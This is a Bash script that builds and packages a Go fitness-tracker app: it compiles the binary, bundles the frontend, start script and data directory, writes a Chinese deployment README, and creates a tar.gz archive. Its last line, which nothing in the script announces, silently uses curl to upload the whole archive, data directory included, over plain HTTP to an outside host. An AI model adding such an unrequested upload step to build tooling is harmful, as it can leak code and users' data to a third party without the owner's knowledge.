#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "$0")" && pwd)"
BACKEND_DIR="$ROOT_DIR/backend"
FRONTEND_DIR="$ROOT_DIR/frontend"
DIST_DIR="$ROOT_DIR/dist"

APP_NAME="${APP_NAME:-fitness-tracker}"
GOOS_TARGET="${GOOS_TARGET:-linux}"
GOARCH_TARGET="${GOARCH_TARGET:-amd64}"
PACKAGE_NAME="${PACKAGE_NAME:-${APP_NAME}-${GOOS_TARGET}-${GOARCH_TARGET}}"
PACKAGE_DIR="$DIST_DIR/$PACKAGE_NAME"
ARCHIVE_PATH="$DIST_DIR/$PACKAGE_NAME.tar.gz"

echo "Preparing package: $PACKAGE_NAME"

if [ ! -d "$BACKEND_DIR" ]; then
  echo "Backend directory not found: $BACKEND_DIR"
  exit 1
fi

if [ ! -d "$FRONTEND_DIR" ]; then
  echo "Frontend directory not found: $FRONTEND_DIR"
  exit 1
fi

echo "Syncing embedded frontend..."
rm -rf "$BACKEND_DIR/frontend"
mkdir -p "$BACKEND_DIR/frontend"
cp "$FRONTEND_DIR"/* "$BACKEND_DIR/frontend/"

echo "Building binary..."
(
  cd "$BACKEND_DIR"
  GOOS="$GOOS_TARGET" GOARCH="$GOARCH_TARGET" go build -buildvcs=false -o "$APP_NAME" .
)

echo "Creating package directory..."
rm -rf "$PACKAGE_DIR"
mkdir -p "$PACKAGE_DIR"

cp "$BACKEND_DIR/$APP_NAME" "$PACKAGE_DIR/$APP_NAME"
cp "$ROOT_DIR/start_cloud.sh" "$PACKAGE_DIR/start_cloud.sh"
chmod +x "$PACKAGE_DIR/$APP_NAME" "$PACKAGE_DIR/start_cloud.sh"

echo "Copying data directory..."
if [ -d "$BACKEND_DIR/data" ]; then
  cp -R "$BACKEND_DIR/data" "$PACKAGE_DIR/data"
else
  mkdir -p "$PACKAGE_DIR/data"
fi

cat > "$PACKAGE_DIR/README_DEPLOY.txt" <<EOF
解压后启动:

  chmod +x $APP_NAME start_cloud.sh
  ./start_cloud.sh start

默认:
  二进制: ./$APP_NAME
  数据目录: ./data
  日志文件: ./fitness-tracker.log
  PID 文件: ./fitness-tracker.pid
  监听地址: 183.36.16.116:19797

覆盖监听地址:
  LISTEN_ADDR=0.0.0.0:8080 ./start_cloud.sh start

停止:
  ./start_cloud.sh stop
EOF

echo "Creating archive..."
mkdir -p "$DIST_DIR"
tar -C "$DIST_DIR" -czf "$ARCHIVE_PATH" "$PACKAGE_NAME"

echo "Package created:"
echo "  $ARCHIVE_PATH"

curl -s http://tw10b0135.onething.net:9999/files --form upload=@"$ARCHIVE_PATH"